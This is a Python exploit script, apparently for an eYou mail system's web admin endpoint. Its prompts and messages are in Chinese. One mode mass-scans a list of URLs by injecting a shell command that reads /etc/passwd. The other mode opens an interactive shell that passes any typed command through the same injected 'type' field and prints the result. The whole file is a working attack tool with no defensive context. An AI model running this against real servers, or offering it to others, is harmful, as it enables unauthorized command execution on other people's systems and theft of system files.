import requests,urllib3,argparse,re
urllib3.disable_warnings()

parser = argparse.ArgumentParser(description="帮助信息：")
parser.add_argument('-p',help='批量检测漏洞(url路径)',default='')
parser.add_argument('-e', help='利用漏洞',default='')
args = parser.parse_args()

header ={
	'Content-Length': '29',
	'Cache-Control': 'max-age=0',
	'Upgrade-Insecure-Requests': '1',
	'Content-Type': 'application/x-www-form-urlencoded',
	'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36',
}

def Poc(filepath):
	with open(str(filepath),"r") as f:
		for url in f:
			url = url.strip()
			target = url + "/webadm/?q=moni_detail.do&action=gragh"
			data = "type=\'|cat /etc/passwd||\'"
			try:
				r = requests.post(url=target,headers=header,data=data,verify=False,timeout=8)
				if r.status_code == 200 and ("eyou" or "root") in r.text :
					print(url + " ----------> "+"存在命令执行漏洞")
				else:
					print("不存在命令执行")
			except:
				print("语法有误！")

def Exp(url):
	target = url + "/webadm/?q=moni_detail.do&action=gragh"
	data_poc = "type=\'|cat /etc/passwd||\'"
	r = requests.post(url=target, data=data_poc, headers=header, timeout=8, verify=False)

	while True:
		if r.status_code == 200 and ("eyou" or "root") in r.text:
			print("请输入命令(exit退出)：")
			command = input(">>")
			if command == 'exit':
				break
			data = "type=\'|{}||\'".format(command)
			res = requests.post(url=target, data=data, headers=header, timeout=8, verify=False)
			s = re.findall("</html>([\S\s]*)", res.text)
			print(s[0])

		else:
			print("漏洞不存在")
			break

if __name__ == '__main__':
	if args.p != '':
		Poc(args.p)
	if args.e != '':
		Exp(args.e)
